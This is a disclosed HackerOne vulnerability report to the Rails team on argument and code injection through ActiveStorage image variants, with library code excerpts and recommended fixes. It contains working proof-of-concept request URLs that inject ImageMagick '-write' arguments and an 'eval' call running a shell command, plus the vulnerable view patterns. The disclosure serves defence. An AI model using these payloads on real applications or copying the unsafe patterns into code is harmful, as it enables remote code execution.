# Argument/Code Injection via ActiveStorage's image transformation functionality

## Report Details
- **Report ID**: 1154034
- **URL**: https://hackerone.com/reports/1154034
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-04-07T03:05:50.107Z
- **Disclosed**: 2023-07-28T00:45:12.641Z

## Reporter
- **Username**: gquadros_
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rails

## Vulnerability Information
# Affected components

Tested on:

1. activestorage 6.1.3.1
2. image\_processing 1.12.1
3. mini\_magick 4.11.0

# Found by

Gabriel Quadros and Ricardo Silva from Conviso Application Security

# Description

## Intro

ActiveStorage has an image transformation functionality [1, 2, 3, 4, 5, 6] which uses the concept of *variants*. By their own words [5]:

> Image blobs can have variants that are the result of a set of transformations applied to the original. These variants are used to create thumbnails, fixed-size avatars, or any other derivative image from the original.

> Variants rely on ImageProcessing gem for the actual transformations of the file, so you must add gem "image\_processing" to your Gemfile if you wish to use variants. By default, images will be processed with ImageMagick using the MiniMagick gem, but you can also switch to the libvips processor operated by the ruby-vips gem).

One example of direct usage can be seen in the docs as:

```ruby
<%= image_tag user.avatar.variant(resize_to_limit: [100, 100]) %>
```

This will create an image tag with a variant URL, which when visited will return the *avatar* image transformed to the new size.

Another example uses the *preview()* method, which can be used to generate images from videos and PDF files. Once the preview image is generated, it also calls *variant()* under the hood.

```html
<ul>
  <% @message.files.each do |file| %>
    <li>
      <%= image_tag file.preview(resize_to_limit: [100, 100]) %>
    </li>
  <% end %>
</ul>
```

## Vulnerabilities

First, it is worth noting that the docs [3, 4, 7] do not state anything about it being insecure to pass user-supplied values as arguments to the *variant()/preview()* methods.

Rails uses the gem ImageProcessing [8] with MiniMagick by default, passing the transformations to the *apply* method.

**File:** activestorage/lib/active\_storage/transformers/image\_processing\_transformer.rb
```ruby
 12 module ActiveStorage                                                          
 13   module Transformers                                                         
 14     class ImageProcessingTransformer < Transformer                            
 15       private                                                                 
 16         def process(file, format:)                                            
 17           processor.                                                          
 18             source(file).                                                     
 19             loader(page: 0).                                                  
 20             convert(format).                                                  
 21             apply(operations).                                                
 22             call                                                              
 23         end
```

This method passes these operations to the *builder* object by iterating over them and calling methods providing arguments, as can be seen below.

**File:** lib/image\_processing/chainable.rb
```ruby
 24     # Add multiple operations as a hash or an array.                          
 25     #                                                                         
 26     #   .apply(resize_to_limit: [400, 400], strip: true)                      
 27     #   # or                                                                  
 28     #   .apply([[:resize_to_limit, [400, 400]], [:strip, true])               
 29     def apply(operations)                                                     
 30       operations.inject(self) do |builder, (name, argument)|                  
 31         if argument == true || argument == nil                                
 32           builder.send(name)                                                  
 33         elsif argument.is_a?(Array)                                           
 34           builder.send(name, *argument)                                       
 35         elsif argument.is_a?(Hash)                                            
 36           builder.send(name, **argument)                                      
 37         else                                                                  
 38           builder.send(name, argument)                                        
 39         end                                                                   
 40       end                                                                     
 41     end
```

At some point, ImageProcessing passes these operations to MiniMagick via method calling as well:

**File:** lib/image\_processing/processor.rb
```ruby
 51     # Calls the operation to perform the processing. If the operation is      
 52     # defined on the processor (macro), calls the method. Otherwise calls the 
 53     # operation directly on the accumulator object. This provides a common    
 54     # umbrella above defined macros and direct operations.                    
 55     def apply_operation(name, *args, &block)                                  
 56       receiver = respond_to?(name) ? self : @accumulator                      
 57                                                                               
 58       if args.last.is_a?(Hash)                                                
 59         kwargs = args.pop                                                     
 60         receiver.public_send(name, *args, **kwargs, &block)                   
 61       else                                                                    
 62         receiver.public_send(name, *args, &block)                             
 63       end                                                                     
 64     end
```

MiniMagick receives these operations by defining a *method\_missing* method, which takes the called methods and convert them to CLI options:

**File:** lib/mini\_magick/tool.rb
```ruby
260     ##                                                                        
261     # Any undefined method will be transformed into a CLI option              
262     #                                                                         
263     # @example                                                                
264     #   mogrify = MiniMagick::Tool.new("mogrify")                             
265     #   mogrify.adaptive_blur("...")                                          
266     #   mogrify.foo_bar                                                       
267     #   mogrify.command.join(" ") # => "mogrify -adaptive-blur ... -foo-bar"  
268     #                                                                         
269     def method_missing(name, *args)                                           
270       option = "-#{name.to_s.tr('_', '-')}"                                   
271       self << option                                                          
272       self.merge!(args)                                                       
273       self                                                                    
274     end
```

### Argument Injection

The first problem arrises when a user-supplied value is passed as input to a hard-coded transformation, such as:

```ruby
<%= image_tag user.avatar.variant(resize: params[:new_size]) %>
```

Since Rails *params[]* can be an array, one thing the attacker could do here is to pass an array and inject arbitrary arguments into the command to be executed (ImageMagick's convert by default).

Example:

```
https://example.com/controller?new_size[]=123&new_size[]=-set&new_size[]=comment&new_size[]=MYCOMMENT&new_size[]=-write&new_size[]=/tmp/file.erb
```

This is going to generate the following command:

```
convert ORIGINAL_IMAGE -auto-orient -resize 123 -set comment MYCOMMENT -write /tmp/file.erb /tmp/image_processing20210328-23426-63rmm2.png
```

Which has the effect of writing a file containing user-controlled data anywhere in the system. This could be used easily to achieve RCE against Rails applications by overwriting ERB files, for example.

### User-controlled transformation

A second problem arrises when the user is also allowed to choose the kind of transformation to be applied, such as:

```ruby
<%= image_tag user.avatar.variant(params[:t].to_s => params[:v].to_s) %>
```

This is still dangerous since ImageMagick's convert program has a lot of powerful command-line options and they can be used to compromise the application. For example, the user could pass:

```
https://example.com/controller?t=write&v=/tmp/file2.erb
```

This is going to generate the following command:

```
convert ORIGINAL_IMAGE -auto-orient -write /tmp/file2.erb /tmp/image_processing20210328-23426-63rmm2.png
```

Which has a similar effect as the previous attack, if we consider the original image is usually user-controlled.

### Code Injection

The third problem occurs due the way ImageProcessing passes the operations to the *builder* object (via *send()*). There is no filtering to check if the called method is a valid operation and this can be explored by an attacker to execute code.

Consider the same pattern as before:

```ruby
<%= image_tag user.avatar.variant(params[:t].to_s => params[:v].to_s) %>
```

The attacker could pass:

```
https://example.com/controller?t=eval&v=system("touch /tmp/hacked")
```

And the Ruby code *system("touch /tmp/hacked")* would be executed.

# Recomendations

1. Add some notes in the documentation to warn developers about the dangers of passing user-supplied data to the affected methods (*variant/preview*) without sanitization;
2. Fix the argument injection problem;
3. Implement an operations whitelist in ImageProcessing, so it won't call unexpected methods.

# References

1. https://guides.rubyonrails.org/active_storage_overview.html#transforming-images
2. https://guides.rubyonrails.org/active_storage_overview.html#previewing-files
3. https://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Blob/Representable.html#method-i-variant
4. https://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Blob/Representable.html#method-i-preview
5. https://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Variant.html
6. https://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Preview.html
7. https://github.com/rails/rails/issues/32989
8. https://github.com/janko/image_processing

## Impact

Vulnerable code patterns could allow the attacker to achieve RCE.

## Attachments
No attachments
